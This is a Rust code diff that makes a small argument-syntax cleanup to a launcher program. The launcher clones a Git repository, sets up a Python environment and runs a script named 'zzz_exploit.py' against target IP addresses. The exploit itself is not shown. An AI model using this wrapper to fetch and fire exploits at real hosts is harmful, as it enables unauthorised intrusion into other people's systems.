@@ -19,7 +19,7 @@ fn main() {
     env::set_current_dir(&exe_dir).unwrap();
 
     debug!("Cloning Git repository");
-    let output = Command::new("git").args(&["clone", GIT_REPO_URL]).output().expect("Failed to clone Git repository");
+    let output = Command::new("git").args(["clone", GIT_REPO_URL]).output().expect("Failed to clone Git repository");
     if !output.stdout.is_empty() { debug!("Output: {:?}", String::from_utf8_lossy(&output.stdout)) }
     if !output.stderr.is_empty() { error!("Error Output: {:?}", String::from_utf8_lossy(&output.stderr)) }
 
@@ -29,7 +29,7 @@ fn main() {
     env::set_current_dir(&repo_dir).expect("Unable to enter Git repository");
 
     debug!("Creating virtual environment");
-    let output = Command::new("python").args(&["-m", "venv", "blue-env"]).output().expect("Failed to create virtual environment");
+    let output = Command::new("python").args(["-m", "venv", "blue-env"]).output().expect("Failed to create virtual environment");
     if !output.stdout.is_empty() { debug!("Output: {:?}", String::from_utf8_lossy(&output.stdout)) }
     if !output.stderr.is_empty() { error!("Error Output: {:?}", String::from_utf8_lossy(&output.stderr)) }
 
@@ -48,12 +48,12 @@ fn main() {
     debug!("Virtual environment pip path: {}", pip_path);
 
     debug!("Updating pip");
-    let output = Command::new(python_path).args(&["-m", "pip", "install", "--upgrade", "pip"]).output().expect("Failed to install dependencies");
+    let output = Command::new(python_path).args(["-m", "pip", "install", "--upgrade", "pip"]).output().expect("Failed to install dependencies");
     if !output.stdout.is_empty() { debug!("Output: {:?}", String::from_utf8_lossy(&output.stdout)) }
     if !output.stderr.is_empty() { error!("Error Output: {:?}", String::from_utf8_lossy(&output.stderr)) }
 
     debug!("Installing dependencies");
-    let output = Command::new(pip_path).args(&["install", "-r", "requirements.txt"]).output().expect("Failed to install dependencies");
+    let output = Command::new(pip_path).args(["install", "-r", "requirements.txt"]).output().expect("Failed to install dependencies");
     if !output.stdout.is_empty() { debug!("Output: {:?}", String::from_utf8_lossy(&output.stdout)) }
     if !output.stderr.is_empty() { error!("Error Output: {:?}", String::from_utf8_lossy(&output.stderr)) }
 
@@ -68,7 +68,7 @@ fn main() {
 
         debug!("Executing exploit");
         // let output = Command::new(python_path).args(&["zzz_exploit.py", &ip_address]).output().expect("Failed to execute exploit");    
-        let output = Command::new(python_path).args(&["zzz_exploit.py", &ip_address]).output().expect("Failed to execute exploit");    
+        let output = Command::new(python_path).args(["zzz_exploit.py", &ip_address]).output().expect("Failed to execute exploit");    
         if !output.stdout.is_empty() { info!("Output: {:?}", String::from_utf8_lossy(&output.stdout)) }
         if !output.stderr.is_empty() { error!("Error Output: {:?}", String::from_utf8_lossy(&output.stderr)) }
     }
